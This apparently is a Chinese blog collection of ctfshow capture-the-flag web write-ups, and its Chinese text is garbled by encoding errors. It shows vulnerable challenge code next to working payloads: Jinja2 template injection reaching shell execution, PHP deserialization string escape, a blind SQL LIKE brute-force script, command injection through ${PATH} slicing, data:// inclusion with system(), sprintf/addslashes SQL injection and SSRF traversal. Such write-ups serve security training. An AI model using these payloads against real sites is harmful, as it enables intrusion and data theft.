<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class zhou&#123;</span><br><span class="line">     public $secret;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $flag=&#x27;flag&#x27;;</span><br><span class="line">        $arg = &quot;get&quot;;</span><br><span class="line">        $this-&gt;arg = $flag; //åŒæ—¶è§¦å‘è§¦å‘__set</span><br><span class="line">    &#125;</span><br><span class="line">    function __set($arg, $argv)</span><br><span class="line">    &#123;  //è§¦å‘æ¡ä»¶ï¼šç»™ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§èµ‹å€¼</span><br><span class="line">        $this-&gt;secret =$arg . $argv;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new zhou();</span><br><span class="line">echo ($a-&gt;secret);</span><br><span class="line">ç»“æœï¼šargflag</span><br></pre></td></tr></table></figure>

<h1 id="2023æ„šäººæ¯"><a href="#2023æ„šäººæ¯" class="headerlink" title="2023æ„šäººæ¯"></a>2023æ„šäººæ¯</h1><h2 id="è¢«é—å¿˜çš„ååºåˆ—åŒ–"><a href="#è¢«é—å¿˜çš„ååºåˆ—åŒ–" class="headerlink" title="è¢«é—å¿˜çš„ååºåˆ—åŒ–"></a>è¢«é—å¿˜çš„ååºåˆ—åŒ–</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># å½“å‰ç›®å½•ä¸­æœ‰ä¸€ä¸ªtxtæ–‡ä»¶å“¦</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;check.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;text == <span class="string">&quot;aaaa&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$this</span>-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$kk</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> cycycycy;</span><br><span class="line">        <span class="variable">$a</span> -&gt; <span class="title function_ invoke__">aaa</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">cipher</span>(<span class="variable">$get</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$get</span> === <span class="string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;eval&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a_a</span> = <span class="variable language_">$this</span> -&gt; a;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\$a_a\$&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ä¸è¡Œå“¦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_AAAAAA&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_ip</span>);</span><br></pre></td></tr></table></figure>

<h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><p>æŸ¥çœ‹åŸç å‘ç°app.zip è®¿é—®ä¸‹è½½ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/hello/&#x27;)</span><br><span class="line">def hello(name=None):</span><br><span class="line">    return render_template(&#x27;hello.html&#x27;,name=name)</span><br><span class="line">@app.route(&#x27;/hello/&lt;name&gt;&#x27;)</span><br><span class="line">def hellodear(name):</span><br><span class="line">    if &quot;ge&quot; in name:</span><br><span class="line">        return render_template_string(&#x27;hello %s&#x27; % name)</span><br><span class="line">    elif &quot;f&quot; not in name:</span><br><span class="line">        return render_template_string(&#x27;hello %s&#x27; % name)</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;Nonononon&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>hello&#x2F;ç›®å½•ä¸‹è¿›è¡Œæ¨¡æ¿æ³¨å…¥ï¼Œæ³¨å…¥å­—ç¬¦å«æœ‰â€˜geâ€™æˆ–è€…æ²¡æœ‰f</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/hello/&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[83].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo Y2F0IC9mbGFn |base64 -d|sh&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><h2 id><a href="#" class="headerlink" title></a></h2><h1 id="æœˆé¥¼æ¯"><a href="#æœˆé¥¼æ¯" class="headerlink" title="æœˆé¥¼æ¯"></a>æœˆé¥¼æ¯</h1><h2 id="web1-æ­¤å¤œåœ†"><a href="#web1-æ­¤å¤œåœ†" class="headerlink" title="web1_æ­¤å¤œåœ†"></a>web1_æ­¤å¤œåœ†</h2><p>ä¸‹è½½é™„ä»¶å¦‚ä¸‹    </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">	public $uname;</span><br><span class="line">	public $password;</span><br><span class="line">	public function __construct($uname,$password)</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;uname=$uname;</span><br><span class="line">		$this-&gt;password=$password;</span><br><span class="line">	&#125;</span><br><span class="line">	public function __wakeup()</span><br><span class="line">	&#123;</span><br><span class="line">			if($this-&gt;password===&#x27;yu22x&#x27;)</span><br><span class="line">			&#123;</span><br><span class="line">				include(&#x27;flag.php&#x27;);</span><br><span class="line">				echo $flag;	</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				echo &#x27;wrong password&#x27;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$uname=$_GET[1];</span><br><span class="line">$password=1;</span><br><span class="line">$ser=filter(serialize(new a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å­—ç¬¦ä¸²å¢å¤šé€ƒé€¸ï¼Œæµ‹è¯•å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password=&#x27;123&#x27;;</span><br><span class="line">    public function __construct($uname,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname=$uname;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;password===&#x27;yu22x&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &#x27;wrong password&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$uname=&#x27;FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&#x27;;</span><br><span class="line">$password=1;</span><br><span class="line">$ser=filter(serialize(new a($uname,$password)));</span><br><span class="line">echo $ser.&quot;\n&quot;;</span><br><span class="line">var_dump(unserialize($ser));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web3-è«è´Ÿå©µå¨Ÿ"><a href="#web3-è«è´Ÿå©µå¨Ÿ" class="headerlink" title="web3_è«è´Ÿå©µå¨Ÿ"></a>web3_è«è´Ÿå©µå¨Ÿ</h2><p>çœ‹æç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„è¯å¤§éƒ¨åˆ†å­—ç¬¦éƒ½è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯_(ä¸‹åˆ’çº¿)æ²¡æœ‰ï¼Œæ·»åŠ Nä¸ª _ (ä¸‹åˆ’çº¿ï¼‰å¯ä»¥çŸ¥é“å¯†ç é•¿åº¦ä¸º32</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like æ¨¡ç³ŠåŒ¹é…</span><br><span class="line"></span><br><span class="line">% è¡¨ç¤ºé›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦çš„ä»»æ„å­—ç¬¦ä¸²</span><br><span class="line">_ï¼ˆä¸‹åˆ’çº¿ï¼‰è¡¨ç¤ºä»»ä½•å•ä¸ªå­—ç¬¦</span><br><span class="line">[ ] è¡¨ç¤ºæŒ‡å®šèŒƒå›´ ([a-f]) æˆ–é›†åˆ ([abcdef]) ä¸­çš„ä»»ä½•å•ä¸ªå­—ç¬¦</span><br><span class="line">[^] ä¸å±äºæŒ‡å®šèŒƒå›´ ([a-f]) æˆ–é›†åˆ ([abcdef]) çš„ä»»ä½•å•ä¸ªå­—ç¬¦</span><br><span class="line">* å®ƒåŒäºDOSå‘½ä»¤ä¸­çš„é€šé…ç¬¦ï¼Œä»£è¡¨å¤šä¸ªå­—ç¬¦</span><br><span class="line">ï¼ŸåŒäºDOSå‘½ä»¤ä¸­çš„ï¼Ÿé€šé…ç¬¦ï¼Œä»£è¡¨å•ä¸ªå­—ç¬¦</span><br><span class="line"># å¤§è‡´åŒä¸Šï¼Œä¸åŒçš„æ˜¯ä»£åªèƒ½ä»£è¡¨å•ä¸ªæ•°å­—</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://95d50cc2-b9e1-475d-bb11-57d5b689f34a.challenge.ctf.show/login.php&quot;</span><br><span class="line"></span><br><span class="line">password=&quot;&quot;</span><br><span class="line">length=32</span><br><span class="line">result=&quot;67815b0c009ee970fe4014abaa3Fa6A0&quot;</span><br><span class="line">for i in range(0,33):</span><br><span class="line">    for j in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;:</span><br><span class="line">        payload=password+j+&quot;_&quot;*(31 - len(password))</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;username&quot;:&quot;yu22x&quot;,</span><br><span class="line">            &quot;password&quot;:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        if &quot;wrong&quot; not in r:</span><br><span class="line">            print(payload)</span><br><span class="line">            password+=j</span><br><span class="line">          #  print(password)</span><br><span class="line">            break</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>fuzzäº†ä¸€ä¸‹å¯ä»¥ä½¿ç”¨çš„å­—ç¬¦æœ‰<code>å¤§å†™å­—æ¯ï¼Œæ•°å­—ï¼Œ&#123; &#125;ï¼Œç©ºæ ¼ï¼Œ$ï¼Œ~</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span><br></pre></td></tr></table></figure>

<p>æˆªå–å˜é‡$PATH ä»å·¦å‘å³ç¬¬å…­ä¸ªå­—ç¬¦çš„ä¸€ä¸ª</p>
<p><img src="/2023/05/22/ctfshow%E5%90%88%E9%9B%86-ctfshow/QQ%E6%88%AA%E5%9B%BE20230528192948.png"></p>
<p>[(12æ¡æ¶ˆæ¯) linux ä¸­${ }æˆªå–å˜é‡å­—ç¬¦ä¸²_æ²‰æµ¸è‡´è¿œçš„åšå®¢-CSDNåšå®¢](<a href="https://blog.csdn.net/weixin_44244371/article/details/103539800#:~:text=linux">https://blog.csdn.net/weixin_44244371/article/details/103539800#:~:text=linux</a> ä¸­%24 { }æˆªå–å˜é‡å­—ç¬¦ä¸² 1 %23å·æˆªå–ï¼Œåˆ é™¤å·¦è¾¹å­—ç¬¦ï¼Œä¿ç•™å³è¾¹å­—ç¬¦ã€‚ ä»£ç å¦‚ä¸‹%3A echo,ä»å·¦è¾¹ç¬¬å‡ ä¸ªå­—ç¬¦å¼€å§‹ï¼Œä¸€ç›´åˆ°ç»“æŸã€‚ â€¦ 7 ä»å³è¾¹ç¬¬å‡ ä¸ªå­—ç¬¦å¼€å§‹ï¼ŒåŠå­—ç¬¦çš„ä¸ªæ•°ã€‚ â€¦ 8 ä»å³è¾¹ç¬¬å‡ ä¸ªå­—ç¬¦å¼€å§‹ï¼Œä¸€ç›´åˆ°ç»“æŸã€‚ )</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/base64 flag.php</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;$&#123;PATH::1&#125;???$&#123;PATH::1&#125;????64 ????.???</span><br></pre></td></tr></table></figure>

<h2 id="web2-æ•…äººå¿ƒ"><a href="#web2-æ•…äººå¿ƒ" class="headerlink" title="web2_æ•…äººå¿ƒ"></a>web2_æ•…äººå¿ƒ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">$url[1]=$_POST[&#x27;url&#x27;];</span><br><span class="line">if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123;</span><br><span class="line">    $d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)));</span><br><span class="line">    if($d)&#123;</span><br><span class="line">             highlight_file(&#x27;hint.php&#x27;);</span><br><span class="line">             if(filter_var($url[1],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                $host=parse_url($url[1]);</span><br><span class="line">                print_r($host); </span><br><span class="line">                if(preg_match(&#x27;/ctfshow\.com$/&#x27;,$host[&#x27;host&#x27;]))&#123;</span><br><span class="line">                    print_r(file_get_contents($url[1]));</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo &#x27;å·®ç‚¹ç‚¹å°±æˆåŠŸäº†ï¼&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &#x27;please give me url!!!&#x27;;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;æƒ³ä¸€æƒ³md5ç¢°æ’åŸç†å§?!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;ç¬¬ä¸€ä¸ªéƒ½è¿‡ä¸äº†è¿˜æƒ³è¦flagå‘€?!&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>phpå°æ•°ç‚¹è¶…è¿‡161ä½åšå¹³æ–¹è¿ç®—æ—¶ä¼šè¢«æˆªæ–­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#x27;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=100;$i&lt;999;$i++)&#123;</span><br><span class="line">    $b = &quot;0e&quot;.$i.&quot;024452&quot;;</span><br><span class="line">    if($b==hash(&quot;md2&quot;, $b))&#123;</span><br><span class="line">        echo $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">for ($i=1000;$i&lt;9999;$i++)&#123;</span><br><span class="line">    $c = &quot;0e&quot;.$i.&quot;48399&quot;;</span><br><span class="line">    if($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)))&#123;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=1e-162&amp;b=0e652024452&amp;c=0e603448399</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contentsä½¿ç”¨ä¸å­˜åœ¨çš„åè®®åå¯¼è‡´ç›®å½•ç©¿è¶Šï¼Œå®ç°SSRF</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=hhh://ctfshow.com/../../../../../fl0g.txt</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/NPFS/p/13747354.html">ctfshow æœˆé¥¼æ¯ Web writeup - NPFS - åšå®¢å›­ (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/rfrder/article/details/113274503">(12æ¡æ¶ˆæ¯) CTFSHOW æœˆé¥¼æ¯ web_ctfshow web3_è«è´Ÿå©µå¨Ÿ_bfengjçš„åšå®¢-CSDNåšå®¢</a></p>
<h1 id="36Dç»ƒæ‰‹èµ›"><a href="#36Dç»ƒæ‰‹èµ›" class="headerlink" title="36Dç»ƒæ‰‹èµ›"></a>36Dç»ƒæ‰‹èµ›</h1><h2 id="ä¸çŸ¥æ‰€æª-jpg"><a href="#ä¸çŸ¥æ‰€æª-jpg" class="headerlink" title="ä¸çŸ¥æ‰€æª.jpg"></a>ä¸çŸ¥æ‰€æª.jpg</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=test/../index.</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$file=$file.&#x27;php&#x27;;</span><br><span class="line">echo $file.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">if(preg_match(&#x27;/test/is&#x27;,$file))</span><br><span class="line">&#123;	include ($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;$file must has test&#x27;;</span><br><span class="line">&#125;?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php%20system(%27cat%20/F*%27);?&gt;test</span><br></pre></td></tr></table></figure>

<h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><h1 id="èŒæ–°èµ›"><a href="#èŒæ–°èµ›" class="headerlink" title="èŒæ–°èµ›"></a>èŒæ–°èµ›</h1><h2 id="ç»™å¥¹"><a href="#ç»™å¥¹" class="headerlink" title="ç»™å¥¹"></a>ç»™å¥¹</h2><p>gitæ³„éœ²ï¼Œgithackä¸‹è½½æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚</p>
<p>é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š</p>
<ul>
<li>å•å¼•å·ï¼ˆâ€™ï¼‰</li>
<li>åŒå¼•å·ï¼ˆâ€ï¼‰</li>
<li>åæ–œæ ï¼ˆ\ï¼‰</li>
<li>NULL</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#x27;admin&#x27;&amp;pass=123%1$&#x27; or 1=1--+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: file=2F666C6167</span><br></pre></td></tr></table></figure>

<p>ä¾‹å­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//addslashes()å‡½æ•°ï¼šåœ¨é¢„å®šä¹‰å‰é¢åŠ åæ–œæ ï¼Œé¢„å®šä¹‰ç¬¦æœ‰å•å¼•å·ï¼ˆ&#x27;ï¼‰ï¼ŒåŒå¼•å·ï¼ˆ&quot;ï¼‰ï¼Œåæ–œæ ï¼ˆ\ï¼‰ï¼ŒNULL</span><br><span class="line">$input = addslashes (&quot;%1$&#x27; or 1=1#&quot; );</span><br><span class="line">$b = sprintf (&quot;AND b=&#x27;%s&#x27;&quot;, $input );</span><br><span class="line">echo $b;</span><br><span class="line">echo &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">$sql = sprintf (&quot;SELECT * FROM t WHERE a=&#x27;%s&#x27; $b &quot;, &#x27;admin&#x27; );</span><br><span class="line">//å¯¹$inputä¸$bè¿›è¡Œäº†æ‹¼æ¥</span><br><span class="line">//$sql = sprintf (&quot;SELECT * FROM t WHERE a=&#x27;%s&#x27; AND b=&#x27;%1$\&#x27; and 1=1#&#x27; &quot;, &#x27;admin&#x27; );</span><br><span class="line">//å¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªå¥å­é‡Œé¢çš„\æ˜¯ç”±addsashesä¸ºäº†è½¬ä¹‰å•å¼•å·è€ŒåŠ ä¸Šçš„ï¼Œä½¿ç”¨%sä¸%1$\ç±»åŒ¹é…adminï¼Œé‚£ä¹ˆadminåªä¼šå‡ºç°åœ¨%sé‡Œï¼Œ%1$\ä¸ºç©º</span><br><span class="line">echo  $sql ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="å‡èµ›ç”Ÿ"><a href="#å‡èµ›ç”Ÿ" class="headerlink" title="å‡èµ›ç”Ÿ"></a>å‡èµ›ç”Ÿ</h2><p><a href="https://blog.csdn.net/qq_46456049/article/details/108589822">(12æ¡æ¶ˆæ¯) php(æ­£åˆ™åŒ¹é…)_php æ­£åˆ™åŒ¹é…_sweetheart7-7çš„åšå®¢-CSDNåšå®¢</a></p>
